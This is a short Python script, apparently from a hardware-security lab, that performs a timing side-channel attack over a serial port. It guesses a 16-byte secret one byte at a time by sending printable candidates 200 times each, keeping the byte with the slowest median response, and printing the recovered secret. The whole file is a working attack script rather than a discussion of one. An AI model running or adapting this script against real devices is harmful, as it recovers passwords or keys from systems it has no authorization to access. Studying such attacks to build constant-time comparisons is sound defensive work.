# T1/analysis/attack.py
import serial, time, statistics

PORT     = 'COM11'
BAUD     = 115200
N        = 200      # mesures par candidat
SECRET_LEN = 16

port = serial.Serial(PORT, BAUD, timeout=5, write_timeout=5)
time.sleep(0.5)

def measure_rtt(candidate: bytes) -> float:
    times = []
    for _ in range(N):
        port.write(candidate)
        t0 = time.perf_counter_ns()
        port.read(1)
        times.append(time.perf_counter_ns() - t0)
    return statistics.median(times)

found = bytearray(SECRET_LEN)
for pos in range(SECRET_LEN):
    best_byte, best_time = 0, 0
    for b in range(32, 127):   # ASCII imprimable
        candidate = bytes(found[:pos]) + bytes([b]) + bytes(SECRET_LEN - pos - 1)
        t = measure_rtt(candidate)
        if t > best_time:
            best_time, best_byte = t, b
    found[pos] = best_byte
    print(f"[{pos:02d}] '{chr(best_byte)}'  RTT median : {best_time/1000:.1f} µs")

port.close()
print("\nSecret reconstruit :", found.decode(errors='replace'))
